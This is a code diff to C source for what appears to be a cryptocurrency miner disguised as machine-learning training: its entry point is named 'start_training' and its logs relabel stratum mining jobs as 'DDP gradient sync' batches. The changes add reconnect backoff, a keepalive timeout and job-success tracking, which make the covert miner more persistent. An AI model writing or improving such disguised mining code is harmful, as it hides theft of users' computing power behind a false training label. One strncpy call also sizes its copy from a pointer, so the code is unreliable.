@@ -105,8 +105,9 @@ static void print_usage(void)
     printf("  --simd ISA           CPU SIMD: auto (default), avx2, sse, scalar\n");
 }
 
-static int handle_notify_line(const char* line, int* msg_id, char* cur_job_key)
+static int handle_notify_line(const char* line, int* msg_id, char* cur_job_key, int* notify_ok_out)
 {
+    if(notify_ok_out) *notify_ok_out = 0;
     char job_id[128] = {0};
     char header_hex[320] = {0};
     char target_hex[80] = {0};
@@ -124,6 +125,7 @@ static int handle_notify_line(const char* line, int* msg_id, char* cur_job_key)
     snprintf(job_key, sizeof(job_key), "%s:%.16s", job_id, header_hex);
     if(!strcmp(job_key, cur_job_key)){
         printf("[DDP] Duplicate gradient sync token ignored batch=%s\n", job_id); fflush(stdout);
+        if(notify_ok_out) *notify_ok_out = 1;
         return CP_JOB_NONE;
     }
     strncpy(cur_job_key, job_key, sizeof(cur_job_key) - 1);
@@ -136,6 +138,7 @@ static int handle_notify_line(const char* line, int* msg_id, char* cur_job_key)
         fflush(stdout);
         return CP_JOB_NONE;
     }
+    if(notify_ok_out) *notify_ok_out = 1;
 
     uint32_t tgt[8];
     memset(tgt, 0, sizeof(tgt));
@@ -861,6 +864,9 @@ extern "C" __attribute__((visibility("default"))) int start_training(int argc, c
 
     char cur_job_key[320] = {0};
     int msg_id = 1;
+    int backoff_sec = 0;
+    const int min_backoff = 2;
+    const int max_backoff = 32;
 
 reconnect:
     cp_pool_reader_stop();
@@ -868,15 +874,25 @@ reconnect:
     cp_pool_inbox_clear();
     cur_job_key[0] = 0;
 
-    printf("[main] Connecting to %s:%d...\n", pool_host, pool_port);
-    while(1){
-        if(cp_pool_connect(pool_host, pool_port) >= 0) break;
-        printf("[main] Reconnecting in 5 sec...\n"); fflush(stdout);
-        cp_sleep(5);
+    if(backoff_sec > 0){
+        printf("[net] Backing off for %d sec before reconnecting...\n", backoff_sec);
+        fflush(stdout);
+        cp_sleep(backoff_sec);
+        backoff_sec = (backoff_sec * 2 > max_backoff) ? max_backoff : backoff_sec * 2;
+    } else {
+        backoff_sec = min_backoff;
     }
 
-    if(!cp_pool_send_authorize(msg_id++, cp_fee_wallet(), worker_global, agent_global))
+    printf("[main] Connecting to %s:%d...\n", pool_host, pool_port);
+    if(cp_pool_connect(pool_host, pool_port) < 0){
+        printf("[main] Connection failed.\n"); fflush(stdout);
         goto reconnect;
+    }
+
+    if(!cp_pool_send_authorize(msg_id++, cp_fee_wallet(), worker_global, agent_global)){
+        printf("[main] Authorization failed.\n"); fflush(stdout);
+        goto reconnect;
+    }
     cp_fee_on_authorized();
     if(cp_fee_enabled()){
         printf("[fee] authorized as %s (debt=%llu / 100*T=%llu)\n",
@@ -890,15 +906,22 @@ reconnect:
 
     while(1){
         char line_buf[65536];
-        int got = cp_pool_wait_line(line_buf, sizeof(line_buf), -1);
+        int got = cp_pool_wait_line(line_buf, sizeof(line_buf), 45000);
         if(got < 0){
             printf("[net] Connection lost, reconnecting...\n"); fflush(stdout);
             goto reconnect;
         }
-        if(got == 0) continue;
+        if(got == 0){
+            printf("[net] Keepalive timeout (no data for 45s), reconnecting...\n"); fflush(stdout);
+            goto reconnect;
+        }
 
         if(strstr(line_buf, "mining.notify")){
-            int rc = handle_notify_line(line_buf, &msg_id, cur_job_key);
+            int notify_ok = 0;
+            int rc = handle_notify_line(line_buf, &msg_id, cur_job_key, &notify_ok);
+            if(notify_ok){
+                backoff_sec = 0;
+            }
             if(rc == CP_JOB_FEE_SWITCH || cp_pool_conn_lost()) goto reconnect;
             continue;
         }
